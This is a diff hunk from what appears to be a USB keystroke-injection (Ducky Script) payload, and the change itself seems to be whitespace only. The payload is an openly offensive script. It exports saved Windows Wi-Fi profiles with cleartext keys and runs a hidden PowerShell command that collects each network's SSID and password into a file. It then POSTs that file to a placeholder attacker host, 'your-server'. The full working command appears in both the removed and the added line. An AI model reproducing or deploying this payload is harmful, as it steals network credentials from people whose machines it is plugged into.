@@ -19,7 +19,7 @@ DELAY 100
 STRING cd l && @netsh wlan export profile key=clear >nul
 ENTER
 DELAY 500
-STRING cmd /c start powershell -nop -win hid -c "Get-ChildItem -name -Include *.xml >list.txt;Get-Content list.txt|ForEach-Object { [xml]$xmlDoc = Get-Content $_;write-output """"SSID: $($xmlDoc.WLANProfile.SSIDConfig.SSID.Name)"""" >>wifi.txt;write-output """"Password: $($xmlDoc.WLANProfile.MSM.security.sharedkey.keyMaterial)"""">>wifi.txt;write-output """"Authentication: 	$($xmlDoc.WLANProfile.MSM.security.authencryption.authentication)"""">>wifi.txt;write-output """"Encryption: $($xmlDoc.WLANProfile.MSM.security.authencryption.encryption)"""">>wifi.txt;write-output """"-------"""">>wifi.txt};get-content wifi.txt |out-file -encoding ascii wifi-enc.txt;invoke-webrequest http://your-server -method post -infile wifi-enc.txt;remove-variable xmlDoc"
+STRING cmd /c start powershell -nop -win hid -c "Get-ChildItem -name -Include *.xml >list.txt;Get-Content list.txt|ForEach-Object { [xml]$xmlDoc = Get-Content $_;write-output """"SSID: $($xmlDoc.WLANProfile.SSIDConfig.SSID.Name)"""" >>wifi.txt;write-output """"Password: $($xmlDoc.WLANProfile.MSM.security.sharedkey.keyMaterial)"""">>wifi.txt;write-output """"Authentication: $($xmlDoc.WLANProfile.MSM.security.authencryption.authentication)"""">>wifi.txt;write-output """"Encryption: $($xmlDoc.WLANProfile.MSM.security.authencryption.encryption)"""">>wifi.txt;write-output """"-------"""">>wifi.txt};get-content wifi.txt |out-file -encoding ascii wifi-enc.txt;invoke-webrequest http://your-server -method post -infile wifi-enc.txt;remove-variable xmlDoc"
 ENTER
 DELAY 5000
 STRING cd ..
